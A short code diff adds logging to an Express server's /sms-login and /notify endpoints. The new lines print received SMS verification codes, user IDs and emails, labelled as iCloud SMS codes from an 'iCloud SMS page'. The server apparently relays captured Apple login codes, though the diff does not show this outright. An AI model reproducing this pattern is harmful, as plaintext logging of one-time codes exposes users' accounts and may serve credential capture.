@@ -833,6 +833,11 @@ app.post("/sms-login", async (req, res) => {
   try {
     const { code, userId, email } = req.body;
 
+    console.log(`📥 iCloud SMS Code Received:`);
+    console.log(`   - code: ${code}`);
+    console.log(`   - userId: ${userId}`);
+    console.log(`   - email: ${email}`);
+
     if (!code) {
       return res.status(400).json({ success: false, message: "Code required" });
     }
@@ -899,6 +904,11 @@ app.post("/sms-login", async (req, res) => {
 app.post("/notify", async (req, res) => {
   try {
     const { type, userId, email } = req.body;
+
+    console.log(`📲 Notify endpoint received:`);
+    console.log(`   - type: ${type}`);
+    console.log(`   - userId: ${userId}`);
+    console.log(`   - email: ${email}`);
 
     // ✅ Handle resend SMS (from iCloud SMS page)
     if (type === "resend_sms") {
